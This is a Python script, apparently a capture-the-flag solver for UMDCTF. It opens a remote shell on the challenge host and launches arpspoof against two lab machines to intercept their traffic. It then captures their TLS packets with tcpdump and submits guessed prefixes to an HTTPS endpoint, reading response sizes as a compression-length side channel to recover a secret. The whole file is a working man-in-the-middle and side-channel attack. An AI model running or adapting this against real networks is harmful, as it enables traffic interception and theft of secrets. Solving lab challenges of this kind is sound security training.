import os
import re
import socket
import sys
import time


class RemoteShell:
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port), timeout=10)
        self.sock.settimeout(2)
        self.read()

    def read(self, wait: float = 0.4) -> str:
        time.sleep(wait)
        out = b""
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                out += chunk
                if out.endswith(b"$ ") or out.endswith(b"# "):
                    break
            except Exception:
                break
        return out.decode("utf-8", "replace")

    def run(self, cmd: str, wait: float = 0.6) -> str:
        self.sock.sendall((cmd + "\n").encode())
        return self.read(wait)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


MEASURE_SECONDS = int(os.environ.get("MEASURE_SECONDS", "4"))


SETUP_CMDS = [
    r"IF=$(ip -o -4 addr show | awk '/10\.0\.0\.3\// {print $2; exit}')",
    r'nohup arpspoof -i "$IF" -t 10.0.0.1 10.0.0.2 >/tmp/arp1.log 2>&1 & AP1=$!',
    r'nohup arpspoof -i "$IF" -t 10.0.0.2 10.0.0.1 >/tmp/arp2.log 2>&1 & AP2=$!',
    rf'''measure(){{ f="$1"; rm -f /tmp/tcp.out; timeout {MEASURE_SECONDS} tcpdump -U -n -i "$IF" host 10.0.0.1 and host 10.0.0.2 and tcp port 443 > /tmp/tcp.out 2>/dev/null & TP=$!; sleep 0.2; curl -sk -X POST --data-urlencode "filter=$f" https://10.0.0.2/api/suggestions >/dev/null; wait $TP 2>/dev/null || true; awk '/10.0.0.2.443 > 10.0.0.1/ && /length [0-9]+/ {{print $NF}}' /tmp/tcp.out | awk 'NR%2==1 {{ if(++k%2==0){{sum+=$1; n++}} }} END {{ if(n) printf "%.3f\n", sum/n; else print "NA" }}'; }}''',
]


def setup(shell: RemoteShell):
    for cmd in SETUP_CMDS:
        shell.run(cmd, 0.6)


def cleanup(shell: RemoteShell):
    shell.run("kill $AP1 $AP2 2>/dev/null || true", 0.5)


def measure(shell: RemoteShell, prefix: str, timeout: float | None = None):
    if timeout is None:
        timeout = MEASURE_SECONDS + 2
    out = shell.run(f'echo -n "{prefix} "; measure "{prefix}"', timeout)
    vals = re.findall(r"(\d+\.\d+|\d+)", out)
    value = float(vals[-1]) if vals else None
    return value, out


def main():
    if len(sys.argv) < 3:
        print("usage: controller.py <port> <prefix> [<prefix> ...]")
        raise SystemExit(2)

    port = int(sys.argv[1])
    prefixes = sys.argv[2:]
    shell = RemoteShell("challs.umdctf.io", port)
    try:
        setup(shell)
        for prefix in prefixes:
            value, _ = measure(shell, prefix)
            print(f"{prefix}\t{value}")
    finally:
        cleanup(shell)
        shell.close()


if __name__ == "__main__":
    main()
